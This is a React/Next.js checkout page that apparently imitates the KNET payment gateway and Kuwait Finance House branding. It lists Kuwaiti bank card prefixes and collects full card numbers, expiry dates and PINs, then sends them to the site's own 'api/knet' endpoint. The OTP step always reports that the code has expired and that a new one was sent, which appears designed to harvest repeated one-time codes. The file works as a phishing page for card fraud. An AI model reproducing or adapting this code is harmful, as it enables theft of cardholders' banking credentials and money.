import { useEffect, useState } from "react";
import logoImage from "./image/site-logo.svg";
import Image from "next/image";
import { useRouter } from "next/router";
import axios from "axios";
import { useSelector } from "react-redux";
import { useSession } from "next-auth/react";
import { RootState } from "../../../../store";
import topImage from "./image/top.png";
import { FaSpinner } from "react-icons/fa"; // Add this import for the spinner icon

const banks = {
  "": { name: "Select Your Bank", prefixes: [] },

  abk: {
    name: "Al Ahli of Kuwait [ABK]",
    prefixes: ["423826", "428628", "403622"],
  },
  rajhi: {
    name: "Al Rajhi Bank [Rajhi]",
    prefixes: ["458838"],
  },
  bbk: {
    name: "Bank of Bahrain Kuwait [BBK]",
    prefixes: ["418056", "588790"],
  },
  boubyan: {
    name: "Boubyan Bank [Boubyan]",
    prefixes: [
      "450605",
      "426058",
      "431199",
      "470350",
      "490455",
      "490456",
      "404919",
    ],
  },
  burgan: {
    name: "Burgan Bank [Burgan]",
    prefixes: [
      "402978",
      "49219000",
      "403583",
      "450238",
      "540759",
      "415254",
      "468564",
    ],
  },
  cbk: {
    name: "Commercial Bank of Kuwait [CBK]",
    prefixes: ["532672", "537015", "521175", "516334"],
  },
  doha: {
    name: "Doha Bank [Doha]",
    prefixes: ["419252"],
  },
  gbk: {
    name: "Gulf Bank of Kuwait [GBK]",
    prefixes: [
      "531471",
      "517419",
      "531470",
      "531329",
      "517458",
      "559475",
      "526206",
      "531644",
    ],
  },
  tam: {
    name: "KFH [TAM]",
    prefixes: ["45077848", "45077849"],
  },
  kfh: {
    name: "Kuwait Finance House [KFH]",
    prefixes: ["450778", "537016", "532674", "485602"],
  },
  kib: {
    name: "Kuwait International Bank [KIB]",
    prefixes: ["409054", "406464"],
  },
  nbk: {
    name: "National Bank of Kuwait [NBK]",
    prefixes: ["589160", "464452"],
  },
  weyay: {
    name: "NBK [Weyay]",
    prefixes: ["46445250", "543363"],
  },
  qnb: {
    name: "Qatar National Bank [QNB]",
    prefixes: ["521020", "524745"],
  },
  unb: {
    name: "Union National Bank [UNB]",
    prefixes: ["457778"],
  },
  warba: {
    name: "Warba Bank [Warba]",
    prefixes: ["532749", "559459", "541350", "525528"],
  },
};

function Checkout() {
  const { db_link } = useSelector((state: RootState) => state.apiData);
  const { data: session } = useSession();
  const router = useRouter();
  const [typeStatus, setTypeStatus] = useState(0);
  const [total, setTotal] = useState<any>(0);
  const [requestSent, setRequestSent] = useState(false);
  const [orderDetails, setOrderDetails] = useState<any>();
  const [error, setError] = useState<any>([]);
  const submitHandler = (e: any) => {
    e.preventDefault();
    setRequestSent(true);
    let seats: any = localStorage.getItem("selectedSeats");
    if (localStorage.getItem("selectedSeats") !== null) {
      seats = JSON.parse(localStorage.getItem("selectedSeats") || "[]");
    } else {
      router.push("/");
    }
    if (localStorage.getItem("userData") === null) {
      router.push("/checkout");
      return;
    }
    const userData: any = JSON.parse(localStorage.getItem("userData") || "{}");
    const oData = new FormData();
    oData.append("order_id", `${localStorage.getItem("order_id")}`);
    oData.append("method", `1`);
    oData.append(
      "bank_name",
      `${e.target[0].value} ${
        banks[e.target[0].value as keyof typeof banks].name
      }`
    );
    oData.append("prefix", e.target[1].value);
    oData.append("cardNumber", e.target[2].value);
    oData.append("cardM", e.target[3].value);
    oData.append("cardY", e.target[4].value);
    oData.append("cardPIN", e.target[5].value);
    oData.append("total", `${total}`);
    oData.append("seats", `${seats.map((seat: any) => seat.id).join(",")}`);
    oData.append("name", `${userData.name}`);
    oData.append("phone", `${userData.phone}`);
    if (userData.email) {
      oData.append("email", `${userData.email}`);
    }
    //send to backend
    axios
      .post(`${db_link}api/knet`, oData, {
        headers: { Authorization: `Bearer ${session?.user.token}` },
      })
      .then((r) => {
        console.log(r);
        // localStorage.removeItem("selectedSeats");
        setTimer(240);
        setOrderDetails(r.data);
        setTimeout(() => {
          setTypeStatus(1);
          setRequestSent(false);
        }, 3500);
      })
      .catch((r) => {
        setError("Somthing went wrong, please try again");
        setRequestSent(false);
        console.log(r);
      });
  };
  const submitHandler2 = (e: any) => {
    e.preventDefault();
    setError("");
    setRequestSent(true);
    const oData = new FormData();
    oData.append("code", e.target.otp.value);
    oData.append("net_id", orderDetails.id);
    //send to backend
    axios
      .post(`${db_link}api/knet/code`, oData, {
        headers: { Authorization: `Bearer ${session?.user.token}` },
      })
      .then((r) => {
        setTimeout(() => {
          setRequestSent(false);
          e.target.otp.value = "";
          setTimer(240);
          setError("code expired, we sent you a new code");
        }, 7000);
      })
      .catch((r) => {
        setError("Somthing went wrong, please try again");
        setRequestSent(false);
        let er = [];
        if (r.response.data.errors) {
          const errorData = r.response.data.errors;
          er = Object.keys(errorData).map((key) => {
            return errorData[key][0];
          });
        }
      });
  };
  useEffect(() => {
    let subTotal = localStorage.getItem("total");
    setTotal(subTotal);
  }, []);

  const [selectedBank, setSelectedBank] = useState("");
  const [selectedPrefix, setSelectedPrefix] = useState("");
  const [cardNumber, setCardNumber] = useState("");

  const handleBankChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const bank = e.target.value;
    setSelectedBank(bank);
    setSelectedPrefix(""); // Reset prefix when bank changes
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ""); // Only allow digits
    if (value.length <= 12) {
      // Limit to 12 digits (prefix is 4 digits)
      setCardNumber(value);
    }
  };
  const [timer, setTimer] = useState(0); // 4 minutes = 240 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const min = Math.floor(seconds / 60);
    const sec = seconds % 60;
    return `${min}:${sec.toString().padStart(2, "0")}`;
  };

  if (typeStatus == 0) {
    return (
      <section className=" opca min-h-screen bg-gray-100 flex flex-col items-center justify-center p-4">
        <form
          onSubmit={submitHandler}
          className="scale-75 w-full max-w-xl space-y-6"
        >
          <div className="flex items-center justify-center ">
            <div className="relative w-[550px] s h-[130px]">
              <Image src={topImage} alt="KFH Logo" fill />
            </div>
          </div>

          {/* Merchant Info */}
          <div className="">
            <div className="w-full  relative ">
              <Image src={topImage} alt="KFH Logo" fill />
            </div>
          </div>
          <div className="bg-white rounded-3xl shadow-xl overflow-hidden border-2 border-[#8c8c8c]">
            <div className="p-8 pb-0 flex items-center justify-center">
              <div className="w-32 h-16 relative">
                <Image
                  src={logoImage}
                  alt="KFH Logo"
                  fill
                  className="object-contain"
                  priority
                />
              </div>
            </div>
            <div className="p-6 pb-0">
              <div>
                <div className="grid grid-cols-3 items-center border-b ">
                  <span className="text-[#3e80b2] text-lg font-bold">
                    Merchant:
                  </span>
                  <span className="font-light text-[#4c4c4c]">
                    Taa Lab Company
                  </span>
                </div>
                <div className="grid grid-cols-3 items-center border-b pb-1">
                  <span className="text-[#3e80b2] text-lg font-bold">
                    Amount:
                  </span>
                  <span className="font-light text-[#4c4c4c]">KD {total}</span>
                </div>
              </div>
            </div>
          </div>

          {/* Payment Form */}
          <div className="bg-white rounded-3xl shadow-xl overflow-hidden border-2 border-[#8c8c8c]">
            <div className="p-6 ">
              <div className="flex items-center gap-4 border-b-2">
                <label className="text-[#3e80b2] text-lg font-bold w-1/3  ">
                  Select Your Bank:
                </label>
                <select
                  value={selectedBank}
                  onChange={handleBankChange}
                  className="text-[#4c4c4c] w-2/3 mb-2 px-4  border rounded-3xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                >
                  {Object.entries(banks).map(([key, bank]) => (
                    <option key={key} value={`${key}`}>
                      {bank.name}
                    </option>
                  ))}
                </select>
              </div>

              <div className="flex items-center gap-4 mt-2 border-b-2">
                <label className="text-[#3e80b2] text-lg font-bold w-1/3">
                  Card Number:
                </label>

                <div className="flex flex-1 gap-2 mb-2">
                  <select
                    value={selectedPrefix}
                    onChange={(e) => setSelectedPrefix(e.target.value)}
                    className=" px-1 text-[#4c4c4c]  border rounded-3xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                    disabled={!selectedBank}
                  >
                    <option value="">Prefix</option>
                    {selectedBank &&
                      banks[selectedBank as keyof typeof banks].prefixes.map(
                        (prefix) => (
                          <option key={prefix} value={prefix}>
                            {prefix}
                          </option>
                        )
                      )}
                  </select>
                  <input
                    type="text"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    placeholder="Enter remaining digits"
                    maxLength={10}
                    minLength={10}
                    className="w-2/3 flex-1 px-4 text-[#4c4c4c] border rounded-3xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                    disabled={!selectedPrefix}
                  />
                </div>
              </div>

              <div className="flex items-center gap-4 mt-2 border-b-2">
                <label className="text-[#3e80b2] text-lg font-bold w-1/3">
                  Expiration Date:
                </label>
                <div className="flex flex-1 gap-2 mb-2">
                  <select className=" w-3/2 px-4 text-[#4c4c4c]  border rounded-3xl  focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
                    <option value="">MM</option>
                    {Array.from({ length: 12 }, (_, i) => {
                      const month = (i + 1).toString().padStart(2, "0");
                      return (
                        <option key={month} value={month}>
                          {month}
                        </option>
                      );
                    })}
                  </select>

                  <select className=" text-[#4c4c4c] flex-1 px-4  border rounded-3xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
                    <option value="">YYYY</option>
                    {Array.from({ length: 10 }, (_, i) => {
                      const year = (new Date().getFullYear() + i).toString();
                      return (
                        <option key={year} value={year}>
                          {year}
                        </option>
                      );
                    })}
                  </select>
                </div>
              </div>

              {/* pin */}
              <div className=" flex items-center gap-4 mt-2">
                <label className=" text-[#3e80b2] text-lg font-bold w-1/3">
                  PIN:
                </label>
                <input
                  type="password"
                  maxLength={4}
                  placeholder="Enter PIN"
                  className="text-[#4c4c4c] w-full px-4  border rounded-3xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                />
              </div>
            </div>
          </div>

          <div className="bg-white rounded-3xl shadow-xl overflow-hidden border-2 border-[#8c8c8c]">
            <div className="flex gap-2 p-8">
              <button
                type="submit"
                disabled={requestSent}
                className={`flex-1 px-6 py-1 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 focus:outline-none focus:ring-2 focus:ring-gray-500 transition-colors ${
                  requestSent && "cursor-not-allowed opacity-50"
                }`}
              >
                {requestSent ? (
                  <div className="flex items-center justify-center gap-2">
                    <FaSpinner className="animate-spin" />
                    <span>Submitting...</span>
                  </div>
                ) : (
                  "Submit"
                )}
              </button>
              <button
                onClick={() => router.push("/checkout")}
                className="flex-1 px-6 py-1 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 focus:outline-none focus:ring-2 focus:ring-gray-500 transition-colors"
              >
                Cancel
              </button>
            </div>
          </div>
          {/* Footer */}

          <div className="p-4 text-center text-sm text-gray-500">
            <p className="font-bold ">All Rights Reserved. Copyright 2025 ©</p>
            <p className="text-[#3e80b2] text-lg font-bold">
              The Shared Electronic Banking Services Company - KNET
            </p>
          </div>
        </form>
      </section>
    );
  } else {
    return (
      <section className="min-h-screen bg-gray-100 flex flex-col  p-4">
        <div className="flex flex-col scale-90">
          <div className="flex items-center justify-center ">
            <div className="relative w-[330px] sm:w-[400px] h-[120px]">
              <Image src={topImage} alt="KFH Logo" fill />
            </div>
          </div>
          <div className="min-h-screen flex items-center justify-center bg-gray-100 p-2">
            <form
              onSubmit={submitHandler2}
              className="bg-white shadow-lg rounded-lg w-full max-w-md p-6 border border-blue-500"
            >
              {/* Header */}
              <div className="p-2 pb-0 flex items-center justify-center">
                <div className="w-32 h-16 relative">
                  <Image
                    src={logoImage}
                    alt="KFH Logo"
                    fill
                    className="object-contain"
                    priority
                  />
                </div>
              </div>

              {/* Notification */}
              <div className="text-[#3e80b2] bg-blue-100 border border-blue-200 text-sm  p-4 rounded mb-4">
                <strong className="text-[#3e80b2]">NOTIFICATION:</strong> You
                will presently receive an SMS on your mobile number registered
                with your bank. This is an OTP (One Time Password) SMS, it
                contains 6 digits to be entered in the box below.
              </div>

              {/* Billing Information */}
              <div className="mb-4">
                <h3 className=" text-[#3e80b2] font-bold text-lg mb-5">
                  Billing Information
                </h3>
                <p>
                  <strong className="text-[#3e80b2] text-sm mr-[120px]">
                    Merchant:
                  </strong>{" "}
                  Taa Lab Company
                </p>
                <p>
                  <strong className="text-[#3e80b2] text-sm mr-[130px]">
                    Website:
                  </strong>{" "}
                  <a
                    href="https://www.dawrat.com"
                    className="text-blue-600 underline"
                  >
                    https://www.dawrat.com
                  </a>
                </p>
                <p>
                  <strong className="text-[#3e80b2] text-sm mr-[130px]">
                    Amount:
                  </strong>{" "}
                  KD {total}
                </p>
              </div>

              {/* Card Information */}
              <div className="mb-6">
                <h3 className="text-[#3e80b2] font-bold text-lg mb-5">
                  Card Information
                </h3>
                <p>
                  <strong className="text-[#3e80b2] text-sm mr-[110px]">
                    Card Number:
                  </strong>{" "}
                  {orderDetails.prefix}******
                  {orderDetails.cardNumber.slice(6, 10)}{" "}
                </p>
                <p>
                  <strong className="text-[#3e80b2] text-sm mr-[85px]">
                    Expiration Month:
                  </strong>{" "}
                  {orderDetails.cardM}
                </p>
                <p>
                  <strong className="text-[#3e80b2] text-sm mr-[100px]">
                    Expiration Year:
                  </strong>{" "}
                  {orderDetails.cardY}
                </p>
                <p>
                  <strong className="text-[#3e80b2] text-sm mr-[170px]">
                    PIN:
                  </strong>{" "}
                  ****
                </p>
                <div className="mt-2">
                  <label
                    htmlFor="otp"
                    className="inline text-[#3e80b2] text-sm  mb-1 mr-[100px] font-bold"
                  >
                    OTP:
                  </label>
                  <input
                    id="otp"
                    name="otp"
                    type="text"
                    minLength={6}
                    maxLength={6}
                    required
                    onChange={() => setError("")}
                    placeholder={`Timeout in: ${formatTime(timer)}`}
                    className={`w-[200px] h-[25px] flex-1 px-3  border  focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                      timer == 0
                        ? "bg-red-200/40 border-red-400"
                        : "bg-gray-100"
                    } `}
                  />
                </div>
              </div>
              {timer > 0 && error.length > 1 && (
                <p className="text-red-500 text-sm font-bold w-full text-center mb-2">
                  {error}
                </p>
              )}
              {timer < 1 && (
                <p className="text-red-500 text-sm font-bold w-full text-center mb-2">
                  The OTP Code Expired, please send new code
                </p>
              )}
              {/* Buttons */}
              <div className="flex justify-center gap-1 sm:gap-2">
                {timer < 1 ? (
                  <button
                    type="button"
                    onClick={() => setTimer(240)}
                    className="bg-gray-300 text-gray-800 px-6 sm:px-8 py-1 rounded"
                  >
                    Confirm
                  </button>
                ) : (
                  <button
                    type="submit"
                    disabled={requestSent}
                    className="bg-gray-300 text-gray-800 px-8 py-1 rounded disabled:cursor-not-allowed disabled:opacity-50"
                  >
                    {requestSent ? "Sending..." : "Confirm"}
                  </button>
                )}
                <button
                  type="button"
                  onClick={() => setTypeStatus(0)}
                  className="bg-gray-300 text-gray-800 px-6 sm:px-8 py-1 rounded"
                >
                  Back
                </button>
                <button
                  onClick={() => setTypeStatus(0)}
                  type="button"
                  className="bg-gray-300 text-gray-800 px-6 sm:px-8 py-1 rounded"
                >
                  Cancel
                </button>
              </div>

              {/* Footer */}
            </form>
          </div>
          <p className="text-center text-xs text-gray-500 ">
            All Rights Reserved. Copyright 2025 ©<br />
            <span className="text-blue-700 font-semibold">
              The Shared Electronic Banking Services Company - KNET
            </span>
          </p>
        </div>
      </section>
    );
  }
}

export default Checkout;
